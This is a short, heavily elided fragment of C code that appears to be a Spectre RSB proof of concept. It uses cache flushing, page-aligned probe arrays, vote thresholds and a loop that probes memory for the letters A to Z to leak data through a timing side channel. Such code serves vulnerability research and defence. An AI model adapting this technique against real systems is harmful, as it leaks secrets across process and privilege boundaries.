...
#define VOTE_BATCH_ROUNDS  4      // evaluate a position every N times we probed it
#define VOTE_MIN_COUNT     3     // winner must have at least this many hits
#define VOTE_MIN_GAP       2    // winner must exceed runner-up by this margin
...
#define SPECTRE RSB
#endif
char __attribute__((aligned(4096))) dummy[16 * 1024];
#else
#error "unsupported arch"
#endif
...
__attribute__((noinline, aligned(4096))) void access_array(int x) {
  ...
  if((x * throttle[0] * throttle[page_size] /*/ throttle[2*page_size] / throttle[3 * page_size]*/) <
    ...
    *call_a = (void*)&return_to2;
    ...
    flush(call_a);
	maccess(data);
	for(int i = 'A'; i <= 'Z'; i++) maccess(mem + i * page_size + 1024);
    mfence();
    nospec();
